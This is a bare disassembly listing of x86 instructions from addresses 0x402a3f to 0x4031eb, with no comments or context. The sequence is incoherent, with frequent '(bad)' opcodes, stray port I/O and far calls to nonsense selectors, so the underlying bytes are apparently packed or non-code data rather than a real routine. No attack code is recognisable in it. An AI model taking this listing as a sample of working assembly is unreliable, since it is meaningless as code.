  402a3f:	outs   dx,DWORD PTR ds:[esi]
  402a40:	push   ebx
  402a41:	fsubr  st,st(0)
  402a43:	call   0xdfb5:0x58324604
  402a4a:	(bad)  
  402a4b:	retf   0xda8c
  402a4e:	sbb    al,0xe
  402a50:	or     esi,ecx
  402a52:	fiadd  DWORD PTR [edi]
  402a54:	push   ss
  402a55:	xor    ebx,DWORD PTR [ecx+edx*8-0x4d]
  402a59:	pushaw 
  402a5b:	(bad)  
  402a5c:	call   0xb82d:0x3d9d0665
  402a63:	dec    ecx
  402a64:	in     eax,dx
  402a65:	pushf  
  402a66:	jge    0x402a8b
  402a68:	dec    eax
  402a69:	sbb    ecx,DWORD PTR [edx+0x5270d0ce]
  402a6f:	inc    eax
  402a70:	cmp    DWORD PTR [esi+0x25bf1d75],edx
  402a76:	fwait
  402a77:	sbb    DWORD PTR [ebp-0x4d9635e2],esp
  402a7d:	mov    al,ds:0xbc0bf0ad
  402a82:	jbe    0x402a2f
  402a84:	lock jl 0x402a41
  402a87:	shr    edx,1
  402a89:	mov    edi,0x554e1d9f
  402a8e:	dec    edx
  402a8f:	and    eax,0xda92ec54
  402a94:	pop    edx
  402a95:	adc    al,0xc1
  402a97:	repz cdq 
  402a99:	push   edi
  402a9a:	jnp    0x402aff
  402a9c:	add    bh,dl
  402a9e:	addr16 push ebp
  402aa0:	inc    eax
  402aa1:	je     0x402a98
  402aa3:	in     eax,dx
  402aa4:	repnz scas al,BYTE PTR es:[edi]
  402aa6:	out    dx,al
  402aa7:	aad    0x1
  402aa9:	jb     0x402ab3
  402aab:	out    dx,al
  402aac:	xor    DWORD PTR [eax],eax
  402aae:	retf   
  402aaf:	je     0x402abb
  402ab1:	pop    eax
  402ab2:	in     al,dx
  402ab3:	mov    ds:0xb7d27321,al
  402ab8:	mov    eax,0x127067ba
  402abd:	sub    BYTE PTR [edi+0x4e],ah
  402ac0:	lods   eax,DWORD PTR ds:[esi]
  402ac1:	sbb    BYTE PTR [ebx-0x17],al
  402ac4:	cdq    
  402ac5:	std    
  402ac6:	dec    ecx
  402ac7:	scas   al,BYTE PTR es:[edi]
  402ac8:	or     DWORD PTR [edx+ebp*2-0x660b9587],edx
  402acf:	mov    edi,0x39e2a4f1
  402ad4:	mov    ah,0x87
  402ad6:	adc    ebp,DWORD PTR [edx-0x47]
  402ad9:	call   0xb0e1:0xdaad5f1
  402ae0:	xchg   esp,eax
  402ae1:	cmp    al,0x59
  402ae3:	inc    esi
  402ae4:	jmp    0x402b07
  402ae6:	ins    BYTE PTR es:[edi],dx
  402ae7:	gs xor dh,ch
  402aea:	inc    edx
  402aeb:	xchg   edx,eax
  402aec:	int3   
  402aed:	xor    al,BYTE PTR [ebx+0x35]
  402af0:	idiv   dh
  402af2:	aad    0x7
  402af4:	scas   eax,DWORD PTR es:[edi]
  402af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402af6:	pop    ecx
  402af7:	fnstenv [eax-0x449726f7]
  402afd:	loop   0x402a81
  402aff:	bswap  esp
  402b01:	les    ebp,FWORD PTR [esi]
  402b03:	scas   al,BYTE PTR es:[edi]
  402b04:	xor    ecx,DWORD PTR [esi]
  402b06:	test   BYTE PTR [edi],dl
  402b08:	mov    bl,BYTE PTR [edx+0x3b4409f6]
  402b0e:	sub    DWORD PTR [edi],ecx
  402b10:	jae    0x402a9f
  402b12:	sub    BYTE PTR [edi+0x0],dh
  402b15:	inc    ecx
  402b16:	gs jge 0x402ae7
  402b19:	mov    DWORD PTR [eax-0x4c],esp
  402b1c:	hlt    
  402b1d:	repnz (bad) 
  402b1f:	inc    esp
  402b20:	psubb  mm3,QWORD PTR [eax]
  402b23:	pop    ds
  402b24:	shl    BYTE PTR gs:[eax+ebp*8-0x76],0x8d
  402b2a:	xchg   ebx,eax
  402b2b:	mov    eax,ds:0x6232c9f
  402b30:	xchg   esi,eax
  402b31:	mov    DWORD PTR [esi+0x65],esi
  402b34:	inc    esi
  402b35:	js     0x402b52
  402b37:	test   DWORD PTR [ebp+0x51c218d7],0xc3773dca
  402b41:	in     eax,dx
  402b42:	or     eax,0x2486b2e3
  402b47:	jnp    0x402b28
  402b49:	mov    esp,0x781b35c4
  402b4e:	in     al,0xdc
  402b50:	inc    ebx
  402b51:	aad    0x5a
  402b53:	fwait
  402b54:	jo     0x402bca
  402b56:	xchg   ecx,eax
  402b57:	stos   DWORD PTR es:[edi],eax
  402b58:	mov    ds:0x52f3f8cc,eax
  402b5d:	mov    al,ds:0x34f17598
  402b62:	shl    BYTE PTR [edx+0x24],1
  402b65:	(bad)  
  402b66:	test   al,0xab
  402b68:	cmp    eax,0x75dc54f7
  402b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b6e:	js     0x402b4b
  402b70:	xor    ebx,DWORD PTR ds:0xcfe53a56
  402b76:	les    esi,FWORD PTR [esi+ebx*4+0x45]
  402b7a:	fbld   TBYTE PTR [eax]
  402b7c:	and    BYTE PTR ds:0x8f7a9b0b,0xe7
  402b83:	(bad)  
  402b84:	out    0x58,al
  402b86:	mov    ebx,0x74cd3afd
  402b8b:	(bad)
  402b8e:	mov    edi,0x381b418b
  402b93:	sbb    ebp,DWORD PTR [esi-0x319a0b0b]
  402b99:	mov    BYTE PTR [esi+0x70e58f59],dl
  402b9f:	sbb    eax,0xe395dc0e
  402ba4:	sbb    ch,0xc0
  402ba7:	adc    cl,BYTE PTR [edi]
  402ba9:	mov    esi,0x3f09233
  402bae:	ss lahf 
  402bb0:	push   ecx
  402bb1:	or     al,0x43
  402bb3:	cmp    al,0x67
  402bb5:	lahf   
  402bb6:	mov    DWORD PTR [esi+0x62],edi
  402bb9:	out    0x52,eax
  402bbb:	mov    cs,WORD PTR [eax]
  402bbd:	adc    esp,DWORD PTR [edi+edi*2-0x3967ba69]
  402bc4:	dec    ecx
  402bc5:	pop    ds
  402bc6:	mov    bh,0x92
  402bc8:	(bad)  
  402bc9:	(bad)  
  402bca:	out    0x2a,eax
  402bcc:	mov    WORD PTR [ecx+ecx*2-0x35],cs
  402bd0:	in     al,dx
  402bd1:	push   ss
  402bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bd3:	sti    
  402bd4:	add    al,0x9e
  402bd6:	test   al,0x68
  402bd8:	adc    DWORD PTR [esi+0x341490f0],0x1beab0df
  402be2:	dec    edx
  402be3:	scas   al,BYTE PTR es:[edi]
  402be4:	imul   DWORD PTR [ebp-0x1164b83e]
  402bea:	je     0x402be3
  402bec:	fcmovne st,st(6)
  402bee:	jbe    0x402bb5
  402bf0:	aam    0x83
  402bf2:	push   ecx
  402bf3:	in     eax,0xf2
  402bf5:	xor    BYTE PTR [ebp+0x10],ch
  402bf8:	mov    BYTE PTR [eax-0xba56b6e],dl
  402bfe:	xor    BYTE PTR [esi-0x57],0x9b
  402c02:	mov    esi,0xc739ee6a
  402c07:	jp     0x402c54
  402c09:	pop    es
  402c0a:	xor    ecx,DWORD PTR [esp+edi*8-0xb]
  402c0e:	enter  0x737a,0x0
  402c12:	cmc    
  402c13:	ret    
  402c14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c15:	pop    ebp
  402c16:	adc    al,0xdd
  402c19:	push   DWORD PTR ds:0x40a8ff0f
  402c1f:	popa   
  402c20:	dec    ebx
  402c21:	push   ds
  402c22:	sbb    edx,ecx
  402c24:	ja     0x402c0c
  402c26:	popa   
  402c27:	imul   edi,DWORD PTR [edi+0x380f323c],0xffffff89
  402c2e:	sbb    ebx,edx
  402c30:	jb     0x402bc2
  402c32:	popf   
  402c33:	jne    0x402bf7
  402c35:	mov    bh,BYTE PTR [edx+0x7d]
  402c38:	and    al,0x31
  402c3a:	out    dx,al
  402c3b:	test   edx,edi
  402c3d:	add    al,0xa7
  402c3f:	and    DWORD PTR [edi-0x15b81e6f],0x2d
  402c46:	adc    esi,ebp
  402c48:	dec    esp
  402c49:	jg     0x402bcf
  402c4b:	in     eax,0x8
  402c4d:	pop    edi
  402c4e:	cwde   
  402c4f:	xlat   BYTE PTR ds:[ebx]
  402c50:	push   0x49cf7e1f
  402c55:	mov    eax,ds:0xb1e526b
  402c5a:	mov    edx,0x710badf4
  402c5f:	mul    DWORD PTR [edi+0x25]
  402c62:	or     eax,0x869a4e02
  402c67:	pop    ebx
  402c68:	mov    al,0x55
  402c6a:	adc    ecx,0x57
  402c6d:	fmul   QWORD PTR [ecx+0x2b]
  402c70:	jne    0x402c92
  402c72:	lods   al,BYTE PTR ds:[esi]
  402c73:	(bad)  
  402c74:	sti    
  402c75:	adc    eax,0xaddc1372
  402c7a:	mov    WORD PTR [edi+0x6fdc309f],ss
  402c80:	jmp    0x402caa
  402c82:	push   edx
  402c83:	cmp    dl,BYTE PTR [ecx-0x29]
  402c86:	retf   
  402c87:	xchg   ecx,eax
  402c88:	or     DWORD PTR [edx],ecx
  402c8a:	sti    
  402c8b:	pop    ds
  402c8c:	or     esp,DWORD PTR [ebx+0x3a7c6539]
  402c92:	lahf   
  402c93:	and    al,0x4d
  402c95:	jmp    0x700c:0xcf87152b
  402c9c:	mov    ch,0xcf
  402c9e:	imul   ecx,DWORD PTR [ecx+0x1b],0x3b
  402ca2:	(bad)  
  402ca4:	xor    bh,BYTE PTR [ecx-0x41]
  402ca7:	test   DWORD PTR [eax],edi
  402ca9:	inc    esp
  402caa:	dec    esp
  402cab:	mov    ebp,ds
  402cad:	into   
  402cae:	xchg   ebx,eax
  402caf:	add    esp,DWORD PTR [eax-0x27]
  402cb2:	or     BYTE PTR [esi-0x1f],al
  402cb5:	fs xchg esi,eax
  402cb7:	push   ecx
  402cb8:	add    eax,0x72b198f
  402cbd:	aad    0x20
  402cbf:	iret   
  402cc0:	xor    al,0xa5
  402cc2:	and    ebp,esi
  402cc4:	pop    es
  402cc5:	lods   eax,DWORD PTR ds:[esi]
  402cc6:	popa   
  402cc7:	das    
  402cc8:	(bad)  
  402cc9:	push   DWORD PTR [esi+eax*8]
  402ccc:	sbb    BYTE PTR [bp+di],bh
  402ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cd0:	aam    0x1b
  402cd2:	fisttp DWORD PTR [ebp-0x69]
  402cd5:	jmp    0x639c11a5
  402cda:	leave  
  402cdb:	sub    BYTE PTR [ebx-0x34],dl
  402cde:	out    0xa9,al
  402ce0:	test   DWORD PTR [ebp+0x57],ecx
  402ce3:	test   edi,eax
  402ce5:	pop    ss
  402ce6:	hlt    
  402ce7:	xor    al,0xe3
  402ce9:	shr    DWORD PTR [ecx+edi*2],1
  402cec:	and    bl,BYTE PTR [edi-0x6]
  402cef:	into   
  402cf0:	add    eax,0x9de7cf49
  402cf5:	aas    
  402cf6:	jnp    0x402c7c
  402cf8:	cmp    ah,ah
  402cfa:	cdq    
  402cfb:	ja     0x402cb6
  402cfd:	cli    
  402cfe:	mov    dl,0xf9
  402d00:	es mov dh,0x67
  402d03:	ret    0x6d27
  402d06:	aad    0x80
  402d08:	push   ss
  402d09:	mov    al,0xd7
  402d0b:	imul   edi,DWORD PTR [eax+0x47],0x65
  402d0f:	aaa    
  402d10:	imul   ebp,DWORD PTR [edx-0x27f4e045],0x51
  402d17:	push   esi
  402d18:	pop    ebx
  402d19:	push   ebp
  402d1a:	out    dx,al
  402d1b:	(bad)  
  402d1c:	(bad)  
  402d1d:	fstp   DWORD PTR [edi-0x1203dcd0]
  402d23:	push   ebp
  402d24:	push   0xfffffff7
  402d26:	mov    ebx,0xf8e7377a
  402d2b:	push   esp
  402d2c:	pop    esp
  402d2d:	xchg   edx,eax
  402d2e:	or     bl,dh
  402d30:	out    dx,al
  402d31:	xchg   ecx,eax
  402d32:	dec    edi
  402d33:	adc    eax,0x40f1671d
  402d38:	cmp    esi,DWORD PTR [eax+ebp*1-0x16f468ab]
  402d3f:	jle    0x402d6f
  402d41:	mov    dl,0x1d
  402d43:	enter  0xfdfc,0xe3
  402d47:	push   esi
  402d48:	(bad)  [esi+0x65]
  402d4b:	sub    eax,0xf7eeabb7
  402d50:	(bad)  
  402d51:	or     al,0x1
  402d53:	push   ds
  402d54:	ret    0xdc55
  402d57:	call   0xed13:0x34402453
  402d5e:	push   ebx
  402d5f:	or     bl,dh
  402d61:	shl    BYTE PTR [ebp+0x75e180d1],cl
  402d67:	push   ss
  402d68:	jle    0x402d4a
  402d6a:	(bad)  
  402d6b:	imul   esp,DWORD PTR [edx],0x5558bdad
  402d71:	and    DWORD PTR [ebx-0x54b3da18],esp
  402d77:	jae    0x402db5
  402d79:	mov    cl,0xc7
  402d7b:	adc    DWORD PTR [eax],eax
  402d7d:	popa   
  402d7e:	mov    ah,0xd7
  402d80:	inc    eax
  402d81:	clc    
  402d82:	cmp    al,0x95
  402d84:	inc    edi
  402d85:	(bad)  
  402d86:	les    esi,FWORD PTR [ebp-0x6d38939f]
  402d8c:	inc    ebp
  402d8d:	js     0x402da5
  402d8f:	mov    ds:0xba4a02f3,eax
  402d94:	or     al,0xfa
  402d96:	fbld   TBYTE PTR [ecx+0x70d0b5bc]
  402d9c:	jnp    0x402e1b
  402d9e:	or     BYTE PTR [eax+0x23b40a5f],bh
  402da4:	lock int3 
  402da6:	(bad)  
  402da7:	sub    dl,BYTE PTR [ebx+0x17ec51b9]
  402dad:	mov    esp,0xde5e94c4
  402db2:	fs pop ds
  402db4:	mov    eax,ds:0x45b94b6b
  402db9:	in     eax,0x87
  402dbb:	in     eax,0xc4
  402dbd:	push   DWORD PTR [edx+0x254b5da8]
  402dc3:	inc    esi
  402dc4:	jl     0x402d81
  402dc6:	data16 jae 0x402e14
  402dc9:	jge    0x402db4
  402dcb:	mov    dh,0xb8
  402dcd:	ins    DWORD PTR es:[edi],dx
  402dce:	xchg   edi,eax
  402dcf:	mov    WORD PTR [eax],cs
  402dd1:	mov    DWORD PTR [edi-0x2d],eax
  402dd4:	sub    DWORD PTR [ecx-0x6ef8e539],ebp
  402dda:	jne    0x402d7c
  402ddc:	jno    0x402e0a
  402dde:	xchg   ebp,eax
  402ddf:	out    0x31,al
  402de1:	dec    esi
  402de2:	push   esp
  402de3:	mov    al,0x38
  402de5:	xlat   BYTE PTR ds:[ebx]
  402de6:	ins    BYTE PTR es:[edi],dx
  402de7:	loopne 0x402de1
  402de9:	test   eax,0xd7a1c4
  402dee:	add    al,0xe5
  402df0:	or     DWORD PTR [edi-0x1],ebp
  402df3:	sar    BYTE PTR [ebx],1
  402df5:	in     al,dx
  402df6:	in     al,0xc3
  402df8:	push   edx
  402df9:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  402dfb:	mov    edi,0x25d1e890
  402e00:	ds call 0x2b45:0x78f65802
  402e08:	cs stc 
  402e0a:	stos   BYTE PTR es:[edi],al
  402e0b:	clc    
  402e0c:	inc    edx
  402e0d:	add    BYTE PTR [ebx],0x7e
  402e10:	xchg   esi,eax
  402e11:	jge    0x402d97
  402e13:	in     eax,dx
  402e14:	(bad)  
  402e15:	je     0x402e8c
  402e17:	pop    ebx
  402e18:	outs   dx,BYTE PTR ds:[esi]
  402e19:	out    0xf7,al
  402e1b:	mov    ah,0xcd
  402e1d:	out    dx,eax
  402e1e:	xor    al,0x5f
  402e20:	ss and al,0x34
  402e23:	out    0xc3,eax
  402e25:	inc    edx
  402e26:	inc    ecx
  402e27:	and    cl,BYTE PTR [esi]
  402e29:	fcom   DWORD PTR [eax-0x47]
  402e2c:	out    dx,al
  402e2d:	and    ch,al
  402e2f:	ja     0x402dcf
  402e31:	das    
  402e32:	out    0x45,eax
  402e34:	ins    DWORD PTR es:[edi],dx
  402e35:	pushf  
  402e36:	(bad)  
  402e37:	es push ecx
  402e39:	int3   
  402e3a:	push   ds
  402e3b:	or     esp,DWORD PTR [edi-0x23d97d11]
  402e41:	jecxz  0x402ea4
  402e43:	sahf   
  402e44:	cdq    
  402e45:	stos   BYTE PTR es:[edi],al
  402e46:	lods   eax,DWORD PTR ds:[esi]
  402e47:	mov    edx,DWORD PTR [edi+0x45]
  402e4a:	loop   0x402e46
  402e4c:	loop   0x402ddc
  402e4e:	(bad)  
  402e50:	xchg   ebp,eax
  402e51:	or     BYTE PTR [eax],dh
  402e53:	add    eax,0xffdb943c
  402e58:	dec    edx
  402e59:	xchg   ebp,eax
  402e5a:	stc    
  402e5b:	xor    BYTE PTR [ebp+0x32],ch
  402e5e:	or     bh,BYTE PTR [esi+0x48382e44]
  402e64:	out    dx,eax
  402e65:	popf   
  402e66:	fnstenv [eax-0x713f8bbb]
  402e6c:	adc    bl,bl
  402e6e:	mov    fs,WORD PTR [esi]
  402e70:	mov    ds,WORD PTR [edi]
  402e72:	sbb    eax,ebx
  402e74:	or     eax,0xef45f6a5
  402e79:	popf   
  402e7a:	fwait
  402e7b:	dec    edx
  402e7c:	test   al,0xf6
  402e7e:	jb     0x402e8d
  402e80:	jo     0x402ead
  402e82:	cmp    eax,0x66230989
  402e87:	jmp    0x402e23
  402e89:	xor    cl,BYTE PTR [ebp+0x3be0b068]
  402e8f:	push   esp
  402e90:	cmp    ebp,ebx
  402e92:	xor    dl,BYTE PTR [esi-0x58515c4c]
  402e98:	call   0x7961:0x24cf4c67
  402e9f:	test   eax,0xc62fe880
  402ea4:	push   eax
  402ea5:	mov    esi,ds
  402ea7:	shl    ebp,0xe
  402eaa:	xchg   BYTE PTR [ebp-0xbdd0ef0],al
  402eb0:	outs   dx,BYTE PTR ds:[esi]
  402eb1:	sti    
  402eb2:	je     0x402eb1
  402eb4:	fsub   DWORD PTR [ebx+0x20]
  402eb7:	push   esi
  402eb8:	rcl    DWORD PTR [eax],1
  402eba:	ja     0x402ee3
  402ebc:	mov    ah,0xa9
  402ebe:	xor    DWORD PTR [edi],0xffffffb6
  402ec1:	push   esi
  402ec2:	pusha  
  402ec3:	cmp    al,0x3f
  402ec5:	inc    ebx
  402ec6:	mov    WORD PTR ds:0xe233af4a,ss
  402ecc:	jbe    0x402f3f
  402ece:	dec    eax
  402ecf:	sbb    BYTE PTR [esp+eax*8],al
  402ed2:	adc    al,dl
  402ed4:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ed6:	iret   
  402ed7:	mov    dh,0x7f
  402ed9:	and    esp,esi
  402edb:	int3   
  402edc:	sbb    al,0xd2
  402ede:	shr    DWORD PTR [ebx+0x50e9fee],cl
  402ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ee5:	pop    ds
  402ee6:	lods   al,BYTE PTR ds:[esi]
  402ee7:	cdq    
  402ee8:	mov    al,0x1d
  402eea:	and    BYTE PTR [esi+edi*2-0x29798bd7],dh
  402ef1:	jmp    0x721d:0x46e4ca0c
  402ef8:	sbb    eax,DWORD PTR [ebp+0x36]
  402efb:	jle    0x402eb5
  402efd:	call   0x7a8a:0x1c0306e0
  402f04:	lea    esp,[ebp-0x4c59768]
  402f0a:	cmp    esp,DWORD PTR [edx+edx*2]
  402f0d:	add    al,0xc0
  402f0f:	inc    esp
  402f10:	mov    ebp,0x60ce15b5
  402f15:	jp     0x402ee6
  402f17:	popf   
  402f18:	retf   0xed1a
  402f1b:	mov    edx,DWORD PTR [eax+0x16eb50f7]
  402f21:	or     al,BYTE PTR [edx+esi*8-0x4cdc31da]
  402f28:	outs   dx,BYTE PTR ds:[esi]
  402f29:	cmp    edi,DWORD PTR [edx+ebp*8]
  402f2c:	popa   
  402f2d:	mov    BYTE PTR [edx],ch
  402f2f:	jo     0x402f84
  402f31:	test   al,0x58
  402f33:	push   edx
  402f34:	dec    eax
  402f35:	outs   dx,DWORD PTR ds:[esi]
  402f36:	adc    bl,BYTE PTR [edx+ebx*4]
  402f39:	mov    esp,DWORD PTR [eax]
  402f3b:	shl    BYTE PTR [ebp-0x59c8982a],1
  402f41:	xor    eax,0x4b3fb516
  402f46:	or     cl,BYTE PTR [ebp+0x67]
  402f49:	or     eax,0xf69897a7
  402f4e:	call   0x2141:0xe57cc2dc
  402f55:	adc    DWORD PTR [edi-0x57677bd1],esp
  402f5b:	rcl    DWORD PTR [esi-0x71],1
  402f5e:	test   eax,0x26332a3f
  402f63:	pop    esi
  402f64:	or     eax,0x52fed324
  402f69:	aas    
  402f6a:	mov    BYTE PTR [ebx+0x42804012],cl
  402f70:	fistp  QWORD PTR [ecx-0x1e]
  402f73:	push   cs
  402f74:	push   ss
  402f75:	outs   dx,DWORD PTR ds:[esi]
  402f76:	pop    ebp
  402f77:	cmp    DWORD PTR [eax+0x2be29b9a],edx
  402f7d:	jle    0x402f09
  402f7f:	(bad)  
  402f80:	push   cs
  402f81:	cmp    ah,BYTE PTR [esp+eax*8-0x11]
  402f85:	xor    edx,DWORD PTR [edi+0x1d7663b4]
  402f8b:	sub    al,0xd9
  402f8d:	or     eax,0xdb78190
  402f92:	jle    0x402f4b
  402f94:	mov    fs,WORD PTR [eax+0x55]
  402f97:	leave  
  402f98:	mov    bh,dl
  402f9a:	pop    esp
  402f9b:	aaa    
  402f9c:	ds cmp eax,0xfb303a10
  402fa2:	jp     0x402f44
  402fa4:	push   esp
  402fa5:	sahf   
  402fa6:	xor    ch,BYTE PTR [eax+0x113d2070]
  402fac:	pop    es
  402fad:	ins    DWORD PTR es:[edi],dx
  402fae:	xchg   esp,eax
  402faf:	hlt    
  402fb0:	pusha  
  402fb1:	sub    BYTE PTR [eax+0x7d88f5fd],dh
  402fb7:	or     edx,esi
  402fb9:	add    bl,BYTE PTR ds:0xa00550dd
  402fbf:	inc    eax
  402fc0:	sub    esi,edi
  402fc2:	stos   DWORD PTR es:[edi],eax
  402fc3:	sbb    ch,BYTE PTR [ecx+0x2435beff]
  402fc9:	xor    ch,BYTE PTR [esi-0x56d4e3d0]
  402fcf:	add    al,0x18
  402fd1:	popf   
  402fd2:	dec    ebp
  402fd3:	enter  0x25b9,0x71
  402fd7:	pop    eax
  402fd8:	xchg   esp,eax
  402fd9:	std    
  402fda:	sbb    DWORD PTR [edi-0x15],ebx
  402fdd:	inc    ebx
  402fde:	je     0x402f84
  402fe0:	jbe    0x40300a
  402fe2:	jmp    0x402ffa
  402fe4:	das    
  402fe5:	mov    cl,0x2f
  402fe7:	mov    ah,BYTE PTR [edx-0x40]
  402fea:	fmul   QWORD PTR [edx+eiz*2-0x68c99c12]
  402ff1:	and    ebx,DWORD PTR [ebx]
  402ff3:	jp     0x402fdc
  402ff5:	xchg   ecx,eax
  402ff6:	stos   DWORD PTR es:[edi],eax
  402ff7:	sub    eax,0xb2f3e2c
  402ffc:	dec    al
  402ffe:	push   ss
  402fff:	ins    BYTE PTR es:[edi],dx
  403000:	mov    ss,esi
  403002:	retf   
  403003:	(bad)
  403007:	inc    ebx
  403008:	or     al,0x19
  40300a:	sub    DWORD PTR [edi+0x1a08a4e9],ebx
  403010:	shr    BYTE PTR [edi-0x7d93f1c4],1
  403016:	mov    bl,0x59
  403018:	out    0x67,al
  40301a:	(bad)  
  40301b:	and    BYTE PTR [esp+eiz*4],cl
  40301e:	pop    ds
  40301f:	lods   al,BYTE PTR ds:[esi]
  403020:	and    DWORD PTR [eax+0x2c660c17],0xc9215455
  40302a:	nop
  40302b:	sbb    al,0x93
  40302d:	push   edx
  40302e:	jne    0x403034
  403030:	iret   
  403031:	imul   edi,DWORD PTR [ebx+0x3e75ca1d],0xffffffe0
  403038:	sbb    bl,BYTE PTR [ebp+eiz*8+0x7c]
  40303c:	jb     0x403081
  40303e:	inc    esp
  40303f:	(bad)  
  403040:	shl    BYTE PTR [edi],0xe3
  403043:	sub    dh,BYTE PTR [ecx-0x15]
  403046:	adc    edi,DWORD PTR [ebp+0x1e]
  403049:	xor    ecx,DWORD PTR [esi+0x59]
  40304c:	outs   dx,BYTE PTR ds:[esi]
  40304d:	in     al,0xd1
  40304f:	daa    
  403050:	push   ecx
  403051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403052:	fcom   QWORD PTR [esi+0x1101de8]
  403058:	xor    BYTE PTR [ecx],0x40
  40305b:	dec    edx
  40305c:	(bad)  
  40305d:	cmc    
  40305e:	fstp   QWORD PTR [esi]
  403060:	iret   
  403061:	mov    bl,0xbb
  403063:	pop    es
  403064:	jae    0x4030d7
  403066:	dec    ecx
  403067:	test   DWORD PTR [ebp+0x3a],0x73a8c2a3
  40306e:	lods   al,BYTE PTR ds:[esi]
  40306f:	shl    esi,0x8c
  403072:	(bad)  
  403074:	xor    al,0x9
  403076:	(bad)  
  403077:	cld    
  403078:	iret   
  403079:	sub    eax,0xbba2d34
  40307e:	test   BYTE PTR [eax-0x66ccc88f],dl
  403084:	into   
  403085:	cmp    edi,DWORD PTR [ebp-0xc55c7c6]
  40308b:	or     cl,al
  40308d:	xchg   ebp,eax
  40308e:	(bad)  
  40308f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403090:	ror    dh,cl
  403092:	push   es
  403093:	scas   eax,DWORD PTR es:[edi]
  403094:	add    ebp,esi
  403096:	dec    esi
  403097:	adc    dl,BYTE PTR [eax+0x48836dd]
  40309d:	fmul   QWORD PTR [eax-0x1cea78b7]
  4030a3:	test   BYTE PTR [edx+0x6e83227f],dl
  4030a9:	cmp    DWORD PTR [esi+0x16689fb],ebp
  4030af:	inc    edi
  4030b0:	in     eax,0x6d
  4030b2:	outs   dx,BYTE PTR ds:[esi]
  4030b3:	dec    esp
  4030b4:	loop   0x40306b
  4030b6:	test   esi,edx
  4030b8:	retf   0x3a4c
  4030bb:	push   esi
  4030bc:	and    eax,0x4520141d
  4030c1:	mov    esp,0x554b14be
  4030c6:	daa    
  4030c7:	mov    eax,0x7e14e498
  4030cc:	jg     0x4030aa
  4030ce:	aaa    
  4030cf:	adc    eax,0xfd2493cb
  4030d4:	xor    edx,DWORD PTR ds:0x1dbfeea7
  4030da:	(bad)  
  4030db:	loopne 0x4030ed
  4030dd:	xchg   ebx,eax
  4030de:	xor    ecx,DWORD PTR [ebx]
  4030e0:	add    al,0xbf
  4030e2:	or     DWORD PTR [esi-0x2c],ebx
  4030e5:	pop    ebx
  4030e6:	retf   
  4030e7:	push   esi
  4030e8:	sbb    ebp,DWORD PTR [eax+0x7e531e40]
  4030ee:	les    esp,FWORD PTR [ebp+eiz*1+0x10]
  4030f2:	sub    bh,cl
  4030f4:	xchg   ebp,eax
  4030f5:	xchg   ecx,eax
  4030f6:	fiadd  WORD PTR [esi+0x5cd397c8]
  4030fc:	int    0x7b
  4030fe:	mov    edi,0xe0cf347d
  403103:	dec    ebx
  403104:	int3   
  403105:	mov    ch,0x5e
  403107:	popa   
  403108:	mov    ch,0x95
  40310a:	or     edi,ebp
  40310c:	or     bl,dh
  40310e:	cmp    BYTE PTR ds:0x9b19518d,dh
  403114:	jl     0x403171
  403116:	leave  
  403117:	mov    ah,0x82
  403119:	or     esp,esp
  40311b:	bnd call 0x6ab3505c
  403121:	sbb    eax,0x38c267b9
  403126:	dec    ebx
  403127:	nop
  403128:	ins    DWORD PTR es:[edi],dx
  403129:	ret    0xc1b4
  40312c:	mov    ds:0x59ea5dd0,eax
  403131:	push   es
  403132:	inc    ebp
  403133:	jnp    0x403114
  403135:	adc    bh,BYTE PTR [edx-0x49a620c7]
  40313b:	mov    eax,ds:0xc9a4563
  403140:	hlt    
  403141:	ja     0x4031c1
  403143:	aam    0x26
  403145:	aad    0x44
  403147:	dec    edx
  403148:	add    al,0x7a
  40314a:	inc    edi
  40314b:	outs   dx,DWORD PTR ds:[esi]
  40314c:	mov    DWORD PTR [eax+0x76],ebx
  40314f:	stos   BYTE PTR es:[edi],al
  403150:	mov    ebx,0xe3110df7
  403155:	jnp    0x4030f9
  403157:	(bad)  
  403158:	pop    esi
  403159:	not    BYTE PTR [edi]
  40315b:	rcl    BYTE PTR [eax-0x2d],1
  40315e:	ds stc 
  403160:	stos   BYTE PTR es:[edi],al
  403161:	push   ds
  403162:	sbb    esi,DWORD PTR [eax-0x16e9d591]
  403168:	mov    BYTE PTR [eax],bl
  40316a:	mov    al,ds:0x33a2eb8f
  40316f:	sub    al,bh
  403171:	test   DWORD PTR [ecx],ebx
  403173:	into   
  403174:	lahf   
  403175:	imul   esi,esi,0x72ff4b1d
  40317b:	push   cs
  40317c:	push   edx
  40317d:	lock inc esp
  40317f:	mov    ah,0x31
  403181:	push   edi
  403182:	es mov ebp,0x4f5cb7b8
  403188:	shl    ah,0x7a
  40318b:	enter  0x9f9f,0xaf
  40318f:	ds popa 
  403191:	sbb    ecx,DWORD PTR [ebp+0x7d4d5561]
  403197:	scas   eax,DWORD PTR es:[edi]
  403198:	mov    BYTE PTR [ebx+0x54],dl
  40319b:	mov    ecx,0xee4938f
  4031a0:	mov    ds:0x7f7ea1c0,eax
  4031a5:	dec    ebx
  4031a6:	rcl    BYTE PTR [edi+ebp*4-0x43],cl
  4031aa:	push   es
  4031ab:	xor    eax,0x2c150aef
  4031b0:	enter  0x4cb7,0xcb
  4031b4:	fst    DWORD PTR [edx+0x5aea5c43]
  4031ba:	push   0x29
  4031bc:	ret    0x1804
  4031bf:	repz pop ecx
  4031c1:	loop   0x403146
  4031c3:	sub    cl,BYTE PTR [esi+0xbc5de9c]
  4031c9:	cmp    eax,0xcb61c988
  4031ce:	icebp  
  4031cf:	jg     0x4031f7
  4031d1:	cmp    cl,bh
  4031d3:	sbb    DWORD PTR ds:0x8842a3aa,esp
  4031d9:	stos   BYTE PTR es:[edi],al
  4031da:	pop    esp
  4031db:	fimul  WORD PTR [eax+ecx*2]
  4031de:	lahf   
  4031df:	sti    
  4031e0:	inc    edx
  4031e1:	sub    BYTE PTR [esi],bh
  4031e3:	push   ss
  4031e4:	adc    esi,esp
  4031e6:	sar    eax,0x9a
  4031e9:	test   al,0xe9
  4031eb:	or     BYTE PTR [ecx+0x2b],0xdf
